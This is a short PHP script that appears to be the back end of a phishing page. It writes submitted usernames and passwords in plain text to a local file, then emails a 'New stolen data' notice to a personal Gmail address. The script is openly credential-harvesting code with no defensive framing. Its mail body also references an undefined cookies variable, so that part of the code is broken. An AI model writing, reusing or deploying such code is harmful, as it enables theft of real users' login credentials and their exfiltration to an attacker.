<?php
// Get the submitted data from the POST request
$username = $_POST['username'];
$password = $_POST['password'];

// Store the credentials in a text file
$file = fopen("credentials.txt", "a");
fwrite($file, "Username: " . $username . "\n");
fwrite($file, "Password: " . $password . "\n\n");
fclose($file);

// Send an email notification with the stolen data
$to = "oussamajmt@gmail.com";
$subject = "New stolen data";
$message = "Stolen cookies: " . $cookies;
$headers = "From: noreply@example.com";

mail($to, $subject, $message, $headers);
?>
